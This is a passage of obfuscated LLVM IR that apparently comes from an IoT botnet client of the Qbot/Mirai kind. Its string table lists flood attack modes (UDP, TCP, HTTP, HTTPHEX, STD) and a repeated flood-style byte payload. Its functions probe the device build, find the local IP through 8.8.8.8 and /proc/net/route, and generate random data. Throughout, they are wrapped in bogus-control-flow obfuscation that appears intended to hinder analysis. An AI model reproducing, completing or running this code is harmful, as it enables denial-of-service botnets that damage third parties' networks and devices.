@.str.127 = private unnamed_addr constant [1021 x i8] c"/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A\00", align 1
@.str.128 = private unnamed_addr constant [7 x i8] c"TELNET\00", align 1
@.str.129 = private unnamed_addr constant [4 x i8] c"OFF\00", align 1
@.str.130 = private unnamed_addr constant [3 x i8] c"ON\00", align 1
@.str.131 = private unnamed_addr constant [4 x i8] c"UDP\00", align 1
@.str.132 = private unnamed_addr constant [4 x i8] c"TCP\00", align 1
@.str.133 = private unnamed_addr constant [5 x i8] c"HTTP\00", align 1
@.str.134 = private unnamed_addr constant [8 x i8] c"HTTPHEX\00", align 1
@.str.135 = private unnamed_addr constant [4 x i8] c"STD\00", align 1
@.str.136 = private unnamed_addr constant [5 x i8] c"STOP\00", align 1
@.str.137 = private unnamed_addr constant [8 x i8] c"8.8.8.8\00", align 1
@.str.138 = private unnamed_addr constant [16 x i8] c"/proc/net/route\00", align 1
@.str.139 = private unnamed_addr constant [11 x i8] c"\0900000000\09\00", align 1
@.str.140 = private unnamed_addr constant [11 x i8] c"BIG_ENDIAN\00", align 1
@.str.141 = private unnamed_addr constant [14 x i8] c"LITTLE_ENDIAN\00", align 1
@.str.142 = private unnamed_addr constant [13 x i8] c"BIG_ENDIAN_W\00", align 1
@.str.143 = private unnamed_addr constant [16 x i8] c"LITTLE_ENDIAN_W\00", align 1
@.str.144 = private unnamed_addr constant [8 x i8] c"UNKNOWN\00", align 1
@.str.145 = private unnamed_addr constant [2 x i8] c"/\00", align 1
@.str.146 = private unnamed_addr constant [134 x i8] c"\1B[0;97m[ \1B[0;91mExecution \1B[0;97m] [ \1B[0;91m%s\1B[0;97m ] Connected -> \1B[0;91m%s\1B[0;97m  | Endian \1B[0;91m%s  \1B[0;97m| Device: \1B[0;91m%s\00", align 1
@.str.147 = private unnamed_addr constant [2 x i8] c" \00", align 1
@x.1 = common global i32 0
@y.2 = common global i32 0
@x.3 = common global i32 0
@y.4 = common global i32 0
@x.5 = common global i32 0
@y.6 = common global i32 0
@x.7 = common global i32 0
@y.8 = common global i32 0
@x.9 = common global i32 0
@y.10 = common global i32 0
@x.11 = common global i32 0
@y.12 = common global i32 0
@x.13 = common global i32 0
@y.14 = common global i32 0
@x.15 = common global i32 0
@y.16 = common global i32 0
@x.17 = common global i32 0
@y.18 = common global i32 0
@x.19 = common global i32 0
@y.20 = common global i32 0
@x.21 = common global i32 0
@y.22 = common global i32 0
@x.23 = common global i32 0
@y.24 = common global i32 0
@x.25 = common global i32 0
@y.26 = common global i32 0
@x.27 = common global i32 0
@y.28 = common global i32 0
@x.29 = common global i32 0
@y.30 = common global i32 0
@x.31 = common global i32 0
@y.32 = common global i32 0
@x.33 = common global i32 0
@y.34 = common global i32 0
@x.35 = common global i32 0
@y.36 = common global i32 0
@x.37 = common global i32 0
@y.38 = common global i32 0
@x.39 = common global i32 0
@y.40 = common global i32 0
@x.41 = common global i32 0
@y.42 = common global i32 0
@x.43 = common global i32 0
@y.44 = common global i32 0
@x.45 = common global i32 0
@y.46 = common global i32 0
@x.47 = common global i32 0
@y.48 = common global i32 0
@x.49 = common global i32 0
@y.50 = common global i32 0
@x.51 = common global i32 0
@y.52 = common global i32 0
@x.53 = common global i32 0
@y.54 = common global i32 0
@x.55 = common global i32 0
@y.56 = common global i32 0
@x.57 = common global i32 0
@y.58 = common global i32 0
@x.59 = common global i32 0
@y.60 = common global i32 0
@x.61 = common global i32 0
@y.62 = common global i32 0
@x.63 = common global i32 0
@y.64 = common global i32 0
@x.65 = common global i32 0
@y.66 = common global i32 0
@x.67 = common global i32 0
@y.68 = common global i32 0
@x.69 = common global i32 0
@y.70 = common global i32 0
@x.71 = common global i32 0
@y.72 = common global i32 0
@x.73 = common global i32 0
@y.74 = common global i32 0
@x.75 = common global i32 0
@y.76 = common global i32 0
@x.77 = common global i32 0
@y.78 = common global i32 0
@x.79 = common global i32 0
@y.80 = common global i32 0
@x.81 = common global i32 0
@y.82 = common global i32 0
@x.83 = common global i32 0
@y.84 = common global i32 0
@x.85 = common global i32 0
@y.86 = common global i32 0
@x.87 = common global i32 0
@y.88 = common global i32 0
@x.89 = common global i32 0
@y.90 = common global i32 0
@x.91 = common global i32 0
@y.92 = common global i32 0
@x.93 = common global i32 0
@y.94 = common global i32 0
@x.95 = common global i32 0
@y.96 = common global i32 0
@x.97 = common global i32 0
@y.98 = common global i32 0
@x.99 = common global i32 0
@y.100 = common global i32 0
@x.101 = common global i32 0
@y.102 = common global i32 0
@x.103 = common global i32 0
@y.104 = common global i32 0
@x.105 = common global i32 0
@y.106 = common global i32 0
@x.107 = common global i32 0
@y.108 = common global i32 0
@x.109 = common global i32 0
@y.110 = common global i32 0
@x.111 = common global i32 0
@y.112 = common global i32 0

; Function Attrs: noinline nounwind uwtable
define i8* @getBuild() #0 {
  ret i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str, i32 0, i32 0)
}

; Function Attrs: noinline nounwind uwtable
define i8* @getBuildz() #0 {
  %1 = alloca i8*, align 8
  %2 = call i32 @access(i8* getelementptr inbounds ([16 x i8], [16 x i8]* @.str.1, i32 0, i32 0), i32 0) #3
  %3 = icmp ne i32 %2, -1
  br i1 %3, label %4, label %21

; <label>:4:                                      ; preds = %0
  %5 = load i32, i32* @x.3
  %6 = load i32, i32* @y.4
  %7 = sub i32 %5, 1
  %8 = mul i32 %5, %7
  %9 = urem i32 %8, 2
  %10 = icmp eq i32 %9, 0
  %11 = icmp slt i32 %6, 10
  %12 = or i1 %10, %11
  br i1 %12, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %4
  store i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.2, i32 0, i32 0), i8** %1, align 8
  %13 = load i32, i32* @x.3
  %14 = load i32, i32* @y.4
  %15 = sub i32 %13, 1
  %16 = mul i32 %13, %15
  %17 = urem i32 %16, 2
  %18 = icmp eq i32 %17, 0
  %19 = icmp slt i32 %14, 10
  %20 = or i1 %18, %19
  br i1 %20, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br label %62

; <label>:21:                                     ; preds = %0
  %22 = load i32, i32* @x.3
  %23 = load i32, i32* @y.4
  %24 = sub i32 %22, 1
  %25 = mul i32 %22, %24
  %26 = urem i32 %25, 2
  %27 = icmp eq i32 %26, 0
  %28 = icmp slt i32 %23, 10
  %29 = or i1 %27, %28
  br i1 %29, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %21
  %30 = call i32 @access(i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.3, i32 0, i32 0), i32 0) #3
  %31 = icmp ne i32 %30, -1
  %32 = load i32, i32* @x.3
  %33 = load i32, i32* @y.4
  %34 = sub i32 %32, 1
  %35 = mul i32 %32, %34
  %36 = urem i32 %35, 2
  %37 = icmp eq i32 %36, 0
  %38 = icmp slt i32 %33, 10
  %39 = or i1 %37, %38
  br i1 %39, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  br i1 %31, label %40, label %57

; <label>:40:                                     ; preds = %originalBBpart24
  %41 = load i32, i32* @x.3
  %42 = load i32, i32* @y.4
  %43 = sub i32 %41, 1
  %44 = mul i32 %41, %43
  %45 = urem i32 %44, 2
  %46 = icmp eq i32 %45, 0
  %47 = icmp slt i32 %42, 10
  %48 = or i1 %46, %47
  br i1 %48, label %originalBB6, label %originalBB6alteredBB

originalBB6:                                      ; preds = %originalBB6alteredBB, %40
  store i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.4, i32 0, i32 0), i8** %1, align 8
  %49 = load i32, i32* @x.3
  %50 = load i32, i32* @y.4
  %51 = sub i32 %49, 1
  %52 = mul i32 %49, %51
  %53 = urem i32 %52, 2
  %54 = icmp eq i32 %53, 0
  %55 = icmp slt i32 %50, 10
  %56 = or i1 %54, %55
  br i1 %56, label %originalBBpart28, label %originalBB6alteredBB

originalBBpart28:                                 ; preds = %originalBB6
  br label %62

; <label>:57:                                     ; preds = %originalBBpart24
  %58 = call i32 @access(i8* getelementptr inbounds ([18 x i8], [18 x i8]* @.str.5, i32 0, i32 0), i32 0) #3
  %59 = icmp ne i32 %58, -1
  br i1 %59, label %60, label %61

; <label>:60:                                     ; preds = %57
  store i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.6, i32 0, i32 0), i8** %1, align 8
  br label %62

; <label>:61:                                     ; preds = %57
  store i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.7, i32 0, i32 0), i8** %1, align 8
  br label %62

; <label>:62:                                     ; preds = %61, %60, %originalBBpart28, %originalBBpart2
  %63 = load i8*, i8** %1, align 8
  ret i8* %63

originalBBalteredBB:                              ; preds = %originalBB, %4
  store i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.2, i32 0, i32 0), i8** %1, align 8
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %21
  %64 = call i32 @access(i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.3, i32 0, i32 0), i32 0) #3
  %65 = icmp ne i32 %64, -1
  br label %originalBB1

originalBB6alteredBB:                             ; preds = %originalBB6, %40
  store i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.4, i32 0, i32 0), i8** %1, align 8
  br label %originalBB6
}

; Function Attrs: nounwind
declare i32 @access(i8*, i32) #1

; Function Attrs: noinline nounwind uwtable
define void @init_rand(i32) #0 {
  %2 = alloca i32, align 4
  %3 = alloca i32, align 4
  store i32 %0, i32* %2, align 4
  %4 = load i32, i32* %2, align 4
  store i32 %4, i32* getelementptr inbounds ([4096 x i32], [4096 x i32]* @Q, i64 0, i64 0), align 16
  %5 = load i32, i32* %2, align 4
  %6 = add i32 %5, -1640531527
  store i32 %6, i32* getelementptr inbounds ([4096 x i32], [4096 x i32]* @Q, i64 0, i64 1), align 4
  %7 = load i32, i32* %2, align 4
  %8 = add i32 %7, -1640531527
  %9 = add i32 %8, -1640531527
  store i32 %9, i32* getelementptr inbounds ([4096 x i32], [4096 x i32]* @Q, i64 0, i64 2), align 8
  store i32 3, i32* %3, align 4
  br label %10

; <label>:10:                                     ; preds = %47, %1
  %11 = load i32, i32* @x.5
  %12 = load i32, i32* @y.6
  %13 = sub i32 %11, 1
  %14 = mul i32 %11, %13
  %15 = urem i32 %14, 2
  %16 = icmp eq i32 %15, 0
  %17 = icmp slt i32 %12, 10
  %18 = or i1 %16, %17
  br i1 %18, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %10
  %19 = load i32, i32* %3, align 4
  %20 = icmp slt i32 %19, 4096
  %21 = load i32, i32* @x.5
  %22 = load i32, i32* @y.6
  %23 = sub i32 %21, 1
  %24 = mul i32 %21, %23
  %25 = urem i32 %24, 2
  %26 = icmp eq i32 %25, 0
  %27 = icmp slt i32 %22, 10
  %28 = or i1 %26, %27
  br i1 %28, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br i1 %20, label %29, label %50

; <label>:29:                                     ; preds = %originalBBpart2
  %30 = load i32, i32* %3, align 4
  %31 = sub nsw i32 %30, 3
  %32 = sext i32 %31 to i64
  %33 = getelementptr inbounds [4096 x i32], [4096 x i32]* @Q, i64 0, i64 %32
  %34 = load i32, i32* %33, align 4
  %35 = load i32, i32* %3, align 4
  %36 = sub nsw i32 %35, 2
  %37 = sext i32 %36 to i64
  %38 = getelementptr inbounds [4096 x i32], [4096 x i32]* @Q, i64 0, i64 %37
  %39 = load i32, i32* %38, align 4
  %40 = xor i32 %34, %39
  %41 = xor i32 %40, -1640531527
  %42 = load i32, i32* %3, align 4
  %43 = xor i32 %41, %42
  %44 = load i32, i32* %3, align 4
  %45 = sext i32 %44 to i64
  %46 = getelementptr inbounds [4096 x i32], [4096 x i32]* @Q, i64 0, i64 %45
  store i32 %43, i32* %46, align 4
  br label %47

; <label>:47:                                     ; preds = %29
  %48 = load i32, i32* %3, align 4
  %49 = add nsw i32 %48, 1
  store i32 %49, i32* %3, align 4
  br label %10

; <label>:50:                                     ; preds = %originalBBpart2
  ret void

originalBBalteredBB:                              ; preds = %originalBB, %10
  %51 = load i32, i32* %3, align 4
  %52 = icmp slt i32 %51, 4096
  br label %originalBB
}

; Function Attrs: noinline nounwind uwtable
define i32 @rand_cmwc() #0 {
  %1 = alloca i64, align 8
  %2 = alloca i64, align 8
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  store i64 18782, i64* %2, align 8
  store i32 -2, i32* %4, align 4
  %5 = load i32, i32* @rand_cmwc.i, align 4
  %6 = add i32 %5, 1
  %7 = and i32 %6, 4095
  store i32 %7, i32* @rand_cmwc.i, align 4
  %8 = load i64, i64* %2, align 8
  %9 = load i32, i32* @rand_cmwc.i, align 4
  %10 = zext i32 %9 to i64
  %11 = getelementptr inbounds [4096 x i32], [4096 x i32]* @Q, i64 0, i64 %10
  %12 = load i32, i32* %11, align 4
  %13 = zext i32 %12 to i64
  %14 = mul i64 %8, %13
  %15 = load i32, i32* @c, align 4
  %16 = zext i32 %15 to i64
  %17 = add i64 %14, %16
  store i64 %17, i64* %1, align 8
  %18 = load i64, i64* %1, align 8
  %19 = lshr i64 %18, 32
  %20 = trunc i64 %19 to i32
  store i32 %20, i32* @c, align 4
  %21 = load i64, i64* %1, align 8
  %22 = load i32, i32* @c, align 4
  %23 = zext i32 %22 to i64
  %24 = add i64 %21, %23
  %25 = trunc i64 %24 to i32
  store i32 %25, i32* %3, align 4
  %26 = load i32, i32* %3, align 4
  %27 = load i32, i32* @c, align 4
  %28 = icmp ult i32 %26, %27
  br i1 %28, label %29, label %34

; <label>:29:                                     ; preds = %0
  %30 = load i32, i32* %3, align 4
  %31 = add i32 %30, 1
  store i32 %31, i32* %3, align 4
  %32 = load i32, i32* @c, align 4
  %33 = add i32 %32, 1
  store i32 %33, i32* @c, align 4
  br label %34

; <label>:34:                                     ; preds = %29, %0
  %35 = load i32, i32* @x.7
  %36 = load i32, i32* @y.8
  %37 = sub i32 %35, 1
  %38 = mul i32 %35, %37
  %39 = urem i32 %38, 2
  %40 = icmp eq i32 %39, 0
  %41 = icmp slt i32 %36, 10
  %42 = or i1 %40, %41
  br i1 %42, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %34
  %43 = load i32, i32* %4, align 4
  %44 = load i32, i32* %3, align 4
  %45 = sub i32 %43, %44
  %46 = load i32, i32* @rand_cmwc.i, align 4
  %47 = zext i32 %46 to i64
  %48 = getelementptr inbounds [4096 x i32], [4096 x i32]* @Q, i64 0, i64 %47
  store i32 %45, i32* %48, align 4
  %49 = load i32, i32* @x.7
  %50 = load i32, i32* @y.8
  %51 = sub i32 %49, 1
  %52 = mul i32 %49, %51
  %53 = urem i32 %52, 2
  %54 = icmp eq i32 %53, 0
  %55 = icmp slt i32 %50, 10
  %56 = or i1 %54, %55
  br i1 %56, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  ret i32 %45

originalBBalteredBB:                              ; preds = %originalBB, %34
  %57 = load i32, i32* %4, align 4
  %58 = load i32, i32* %3, align 4
  %_ = shl i32 %57, %58
  %_1 = sub i32 0, %57
  %gen = add i32 %_1, %58
  %_2 = shl i32 %57, %58
  %_3 = sub i32 %57, %58
  %gen4 = mul i32 %_3, %58
  %_5 = sub i32 %57, %58
  %gen6 = mul i32 %_5, %58
  %_7 = sub i32 %57, %58
  %gen8 = mul i32 %_7, %58
  %59 = sub i32 %57, %58
  %60 = load i32, i32* @rand_cmwc.i, align 4
  %61 = zext i32 %60 to i64
  %62 = getelementptr inbounds [4096 x i32], [4096 x i32]* @Q, i64 0, i64 %61
  store i32 %59, i32* %62, align 4
  br label %originalBB
}

; Function Attrs: noinline nounwind uwtable
define void @rand_init() #0 {
  %1 = load i32, i32* @x.9
  %2 = load i32, i32* @y.10
  %3 = sub i32 %1, 1
  %4 = mul i32 %1, %3
  %5 = urem i32 %4, 2
  %6 = icmp eq i32 %5, 0
  %7 = icmp slt i32 %2, 10
  %8 = or i1 %6, %7
  br i1 %8, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %0
  %9 = call i64 @time(i64* null) #3
  %10 = trunc i64 %9 to i32
  store i32 %10, i32* @x, align 4
  %11 = call i32 @getpid() #3
  %12 = call i32 @getppid() #3
  %13 = xor i32 %11, %12
  store i32 %13, i32* @y, align 4
  %14 = call i64 @clock() #3
  %15 = trunc i64 %14 to i32
  store i32 %15, i32* @z, align 4
  %16 = load i32, i32* @z, align 4
  %17 = load i32, i32* @y, align 4
  %18 = xor i32 %16, %17
  store i32 %18, i32* @w, align 4
  %19 = load i32, i32* @x.9
  %20 = load i32, i32* @y.10
  %21 = sub i32 %19, 1
  %22 = mul i32 %19, %21
  %23 = urem i32 %22, 2
  %24 = icmp eq i32 %23, 0
  %25 = icmp slt i32 %20, 10
  %26 = or i1 %24, %25
  br i1 %26, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  ret void

originalBBalteredBB:                              ; preds = %originalBB, %0
  %27 = call i64 @time(i64* null) #3
  %28 = trunc i64 %27 to i32
  store i32 %28, i32* @x, align 4
  %29 = call i32 @getpid() #3
  %30 = call i32 @getppid() #3
  %_ = shl i32 %29, %30
  %_1 = sub i32 %29, %30
  %gen = mul i32 %_1, %30
  %_2 = sub i32 0, %29
  %gen3 = add i32 %_2, %30
  %_4 = sub i32 0, %29
  %gen5 = add i32 %_4, %30
  %_6 = sub i32 0, %29
  %gen7 = add i32 %_6, %30
  %_8 = sub i32 %29, %30
  %gen9 = mul i32 %_8, %30
  %_10 = shl i32 %29, %30
  %31 = xor i32 %29, %30
  store i32 %31, i32* @y, align 4
  %32 = call i64 @clock() #3
  %33 = trunc i64 %32 to i32
  store i32 %33, i32* @z, align 4
  %34 = load i32, i32* @z, align 4
  %35 = load i32, i32* @y, align 4
  %_11 = sub i32 %34, %35
  %gen12 = mul i32 %_11, %35
  %_13 = shl i32 %34, %35
  %36 = xor i32 %34, %35
  store i32 %36, i32* @w, align 4
  br label %originalBB
}

; Function Attrs: nounwind
declare i64 @time(i64*) #1

; Function Attrs: nounwind
declare i32 @getpid() #1

; Function Attrs: nounwind
declare i32 @getppid() #1

; Function Attrs: nounwind
declare i64 @clock() #1

; Function Attrs: noinline nounwind uwtable
define i32 @rand_next() #0 {
  %1 = load i32, i32* @x.11
  %2 = load i32, i32* @y.12
  %3 = sub i32 %1, 1
  %4 = mul i32 %1, %3
  %5 = urem i32 %4, 2
  %6 = icmp eq i32 %5, 0
  %7 = icmp slt i32 %2, 10
  %8 = or i1 %6, %7
  br i1 %8, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %0
  %9 = alloca i32, align 4
  %10 = load i32, i32* @x, align 4
  store i32 %10, i32* %9, align 4
  %11 = load i32, i32* %9, align 4
  %12 = shl i32 %11, 11
  %13 = load i32, i32* %9, align 4
  %14 = xor i32 %13, %12
  store i32 %14, i32* %9, align 4
  %15 = load i32, i32* %9, align 4
  %16 = lshr i32 %15, 8
  %17 = load i32, i32* %9, align 4
  %18 = xor i32 %17, %16
  store i32 %18, i32* %9, align 4
  %19 = load i32, i32* @y, align 4
  store i32 %19, i32* @x, align 4
  %20 = load i32, i32* @z, align 4
  store i32 %20, i32* @y, align 4
  %21 = load i32, i32* @w, align 4
  store i32 %21, i32* @z, align 4
  %22 = load i32, i32* @w, align 4
  %23 = lshr i32 %22, 19
  %24 = load i32, i32* @w, align 4
  %25 = xor i32 %24, %23
  store i32 %25, i32* @w, align 4
  %26 = load i32, i32* %9, align 4
  %27 = load i32, i32* @w, align 4
  %28 = xor i32 %27, %26
  store i32 %28, i32* @w, align 4
  %29 = load i32, i32* @w, align 4
  %30 = load i32, i32* @x.11
  %31 = load i32, i32* @y.12
  %32 = sub i32 %30, 1
  %33 = mul i32 %30, %32
  %34 = urem i32 %33, 2
  %35 = icmp eq i32 %34, 0
  %36 = icmp slt i32 %31, 10
  %37 = or i1 %35, %36
  br i1 %37, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  ret i32 %29

originalBBalteredBB:                              ; preds = %originalBB, %0
  %38 = alloca i32, align 4
  %39 = load i32, i32* @x, align 4
  store i32 %39, i32* %38, align 4
  %40 = load i32, i32* %38, align 4
  %_ = sub i32 0, %40
  %gen = add i32 %_, 11
  %_1 = shl i32 %40, 11
  %_2 = sub i32 %40, 11
  %gen3 = mul i32 %_2, 11
  %_4 = shl i32 %40, 11
  %_5 = shl i32 %40, 11
  %41 = shl i32 %40, 11
  %42 = load i32, i32* %38, align 4
  %_6 = sub i32 %42, %41
  %gen7 = mul i32 %_6, %41
  %_8 = shl i32 %42, %41
  %_9 = shl i32 %42, %41
  %_10 = sub i32 %42, %41
  %gen11 = mul i32 %_10, %41
  %_12 = shl i32 %42, %41
  %_13 = shl i32 %42, %41
  %_14 = sub i32 %42, %41
  %gen15 = mul i32 %_14, %41
  %43 = xor i32 %42, %41
  store i32 %43, i32* %38, align 4
  %44 = load i32, i32* %38, align 4
  %_16 = sub i32 0, %44
  %gen17 = add i32 %_16, 8
  %_18 = sub i32 %44, 8
  %gen19 = mul i32 %_18, 8
  %_20 = sub i32 0, %44
  %gen21 = add i32 %_20, 8
  %45 = lshr i32 %44, 8
  %46 = load i32, i32* %38, align 4
  %_22 = sub i32 0, %46
  %gen23 = add i32 %_22, %45
  %_24 = shl i32 %46, %45
  %_25 = sub i32 %46, %45
  %gen26 = mul i32 %_25, %45
  %_27 = sub i32 %46, %45
  %gen28 = mul i32 %_27, %45
  %_29 = sub i32 %46, %45
  %gen30 = mul i32 %_29, %45
  %_31 = sub i32 0, %46
  %gen32 = add i32 %_31, %45
  %_33 = sub i32 %46, %45
  %gen34 = mul i32 %_33, %45
  %47 = xor i32 %46, %45
  store i32 %47, i32* %38, align 4
  %48 = load i32, i32* @y, align 4
  store i32 %48, i32* @x, align 4
  %49 = load i32, i32* @z, align 4
  store i32 %49, i32* @y, align 4
  %50 = load i32, i32* @w, align 4
  store i32 %50, i32* @z, align 4
  %51 = load i32, i32* @w, align 4
  %_35 = sub i32 0, %51
  %gen36 = add i32 %_35, 19
  %_37 = shl i32 %51, 19
  %_38 = shl i32 %51, 19
  %_39 = sub i32 %51, 19
  %gen40 = mul i32 %_39, 19
  %_41 = sub i32 %51, 19
  %gen42 = mul i32 %_41, 19
  %_43 = sub i32 0, %51
  %gen44 = add i32 %_43, 19
  %_45 = sub i32 0, %51
  %gen46 = add i32 %_45, 19
  %52 = lshr i32 %51, 19
  %53 = load i32, i32* @w, align 4
  %_47 = sub i32 %53, %52
  %gen48 = mul i32 %_47, %52
  %_49 = sub i32 0, %53
  %gen50 = add i32 %_49, %52
  %_51 = sub i32 %53, %52
  %gen52 = mul i32 %_51, %52
  %_53 = sub i32 %53, %52
  %gen54 = mul i32 %_53, %52
  %_55 = shl i32 %53, %52
  %_56 = sub i32 0, %53
  %gen57 = add i32 %_56, %52
  %54 = xor i32 %53, %52
  store i32 %54, i32* @w, align 4
  %55 = load i32, i32* %38, align 4
  %56 = load i32, i32* @w, align 4
  %_58 = shl i32 %56, %55
  %_59 = sub i32 %56, %55
  %gen60 = mul i32 %_59, %55
  %_61 = sub i32 %56, %55
  %gen62 = mul i32 %_61, %55
  %_63 = sub i32 %56, %55
  %gen64 = mul i32 %_63, %55
  %_65 = shl i32 %56, %55
  %_66 = sub i32 %56, %55
  %gen67 = mul i32 %_66, %55
  %57 = xor i32 %56, %55
  store i32 %57, i32* @w, align 4
  %58 = load i32, i32* @w, align 4
  br label %originalBB
}

; Function Attrs: noinline nounwind uwtable
define void @rand_str(i8*, i32) #0 {
  %3 = load i32, i32* @x.13
  %4 = load i32, i32* @y.14
  %5 = sub i32 %3, 1
  %6 = mul i32 %3, %5
  %7 = urem i32 %6, 2
  %8 = icmp eq i32 %7, 0
  %9 = icmp slt i32 %4, 10
  %10 = or i1 %8, %9
  br i1 %10, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %2
  %11 = alloca i8*, align 8
  %12 = alloca i32, align 4
  store i8* %0, i8** %11, align 8
  store i32 %1, i32* %12, align 4
  %13 = load i32, i32* @x.13
  %14 = load i32, i32* @y.14
  %15 = sub i32 %13, 1
  %16 = mul i32 %13, %15
  %17 = urem i32 %16, 2
  %18 = icmp eq i32 %17, 0
  %19 = icmp slt i32 %14, 10
  %20 = or i1 %18, %19
  br i1 %20, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br label %21

; <label>:21:                                     ; preds = %originalBBpart24, %originalBBpart2
  %22 = load i32, i32* %12, align 4
  %23 = icmp sgt i32 %22, 0
  br i1 %23, label %24, label %78

; <label>:24:                                     ; preds = %21
  %25 = load i32, i32* %12, align 4
  %26 = icmp sge i32 %25, 4
  br i1 %26, label %27, label %37

; <label>:27:                                     ; preds = %24
  %28 = call i32 @rand_next()
  %29 = load i8*, i8** %11, align 8
  %30 = bitcast i8* %29 to i32*
  store i32 %28, i32* %30, align 4
  %31 = load i8*, i8** %11, align 8
  %32 = getelementptr inbounds i8, i8* %31, i64 4
  store i8* %32, i8** %11, align 8
  %33 = load i32, i32* %12, align 4
  %34 = sext i32 %33 to i64
  %35 = sub i64 %34, 4
  %36 = trunc i64 %35 to i32
  store i32 %36, i32* %12, align 4
  br label %61

; <label>:37:                                     ; preds = %24
  %38 = load i32, i32* %12, align 4
  %39 = icmp sge i32 %38, 2
  br i1 %39, label %40, label %52

; <label>:40:                                     ; preds = %37
  %41 = call i32 @rand_next()
  %42 = and i32 %41, 65535
  %43 = trunc i32 %42 to i16
  %44 = load i8*, i8** %11, align 8
  %45 = bitcast i8* %44 to i16*
  store i16 %43, i16* %45, align 2
  %46 = load i8*, i8** %11, align 8
  %47 = getelementptr inbounds i8, i8* %46, i64 2
  store i8* %47, i8** %11, align 8
  %48 = load i32, i32* %12, align 4
  %49 = sext i32 %48 to i64
  %50 = sub i64 %49, 2
  %51 = trunc i64 %50 to i32
  store i32 %51, i32* %12, align 4
  br label %60

; <label>:52:                                     ; preds = %37
  %53 = call i32 @rand_next()
  %54 = and i32 %53, 255
  %55 = trunc i32 %54 to i8
  %56 = load i8*, i8** %11, align 8
  %57 = getelementptr inbounds i8, i8* %56, i32 1
  store i8* %57, i8** %11, align 8
  store i8 %55, i8* %56, align 1
  %58 = load i32, i32* %12, align 4
  %59 = add nsw i32 %58, -1
  store i32 %59, i32* %12, align 4
  br label %60

; <label>:60:                                     ; preds = %52, %40
  br label %61

; <label>:61:                                     ; preds = %60, %27
  %62 = load i32, i32* @x.13
  %63 = load i32, i32* @y.14
  %64 = sub i32 %62, 1
  %65 = mul i32 %62, %64
  %66 = urem i32 %65, 2
  %67 = icmp eq i32 %66, 0
  %68 = icmp slt i32 %63, 10
  %69 = or i1 %67, %68
  br i1 %69, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %61
  %70 = load i32, i32* @x.13
  %71 = load i32, i32* @y.14
  %72 = sub i32 %70, 1
  %73 = mul i32 %70, %72
  %74 = urem i32 %73, 2
  %75 = icmp eq i32 %74, 0
  %76 = icmp slt i32 %71, 10
  %77 = or i1 %75, %76
  br i1 %77, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  br label %21

; <label>:78:                                     ; preds = %21
  %79 = load i32, i32* @x.13
  %80 = load i32, i32* @y.14
  %81 = sub i32 %79, 1
  %82 = mul i32 %79, %81
  %83 = urem i32 %82, 2
  %84 = icmp eq i32 %83, 0
  %85 = icmp slt i32 %80, 10
  %86 = or i1 %84, %85
  br i1 %86, label %originalBB6, label %originalBB6alteredBB

originalBB6:                                      ; preds = %originalBB6alteredBB, %78
